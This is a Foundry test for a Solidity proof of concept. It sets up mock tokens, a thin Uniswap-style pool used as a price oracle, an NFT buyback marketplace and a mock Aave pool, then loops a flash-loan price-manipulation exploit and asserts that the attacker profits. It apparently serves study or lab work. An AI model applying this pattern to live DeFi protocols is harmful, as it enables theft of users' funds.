// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Uniswap} from "../src/Uniswap.sol";
import {NftMarketplace} from "../src/NftMarketplace.sol";
import {FlashContract} from "../src/FlashContract.sol";
import {cNGN} from "./mocks/cNGN.sol";
import {USDT} from "./mocks/USDT.sol";
import {MockAavePool} from "./mocks/MockAavePool.sol";
import {IERC20} from "aave-v3-core/contracts/dependencies/openzeppelin/contracts/IERC20.sol";

contract FlashLoanExploitTest is Test {
    cNGN public cngnToken;
    USDT public usdtToken;
    Uniswap public uniswap;
    NftMarketplace public nftMarketplace;
    FlashContract public flashContract;
    MockAavePool public aavePool;

    uint256 constant INITIAL_MINT_BALANCE = 100_000e18;
    uint256 constant FLASH_LOAN_AMOUNT = 900e18;

    function setUp() public {
        // Deploy mock tokens
        cngnToken = new cNGN(INITIAL_MINT_BALANCE);
        usdtToken = new USDT(INITIAL_MINT_BALANCE);

        // Deploy Uniswap and add initial liquidity: 100 cNGN / 10 USDT
        uniswap = new Uniswap(address(cngnToken), address(usdtToken));
        cngnToken.approve(address(uniswap), 100e18);
        usdtToken.approve(address(uniswap), 10e18);
        uniswap.addLiquidity(100e18, 10e18);

        // Deploy NFT Marketplace and fund it with cNGN for buybacks
        nftMarketplace = new NftMarketplace(IERC20(address(cngnToken)), uniswap);
        cngnToken.mint(address(nftMarketplace), 1000e18);

        // Deploy mock Aave pool and fund it with cNGN liquidity
        aavePool = new MockAavePool(address(cngnToken));
        cngnToken.transfer(address(aavePool), 1000e18);

        // Deploy FlashContract with access to Aave, Uniswap, and Marketplace
        flashContract = new FlashContract(address(aavePool), address(uniswap), address(nftMarketplace));

        // Allow NFT marketplace to spend cNGN from FlashContract
        vm.prank(address(flashContract));
        cngnToken.approve(address(nftMarketplace), type(uint256).max);

        // Mint 1 cNGN to FlashContract to satisfy minimal NFT payment
        cngnToken.mint(address(flashContract), 1e18);
    }

    function testExploit() public {
        // ---- Log initial state ----
        console.log("Initial cNGN balance of Aave Lending Pool:", cngnToken.balanceOf(address(aavePool)));
        console.log("Initial cNGN balance of FlashContract:", cngnToken.balanceOf(address(flashContract)) / 1e18);
        console.log("Initial NFT price (cNGN):", uniswap.getPriceInCngn() / 1e18);

        // ---- Execute exploit multiple times ----
        // In a real scenario, we would mint all NFTs in one batch if supported (ERC721A).
        for (uint256 i = 0; i < 100; i++) {
            flashContract.fn_RequestFlashLoan(address(cngnToken), FLASH_LOAN_AMOUNT);
        }

        // ---- Log final state and validate profit ----
        uint256 finalBalance = cngnToken.balanceOf(address(flashContract));
        console.log("Final cNGN balance of Aave Lending Pool:", cngnToken.balanceOf(address(aavePool)));
        console.log("Final cNGN balance of FlashContract:", finalBalance / 1e18);
        assertGt(finalBalance, 0, "Exploit failed: No profit made");
    }
}
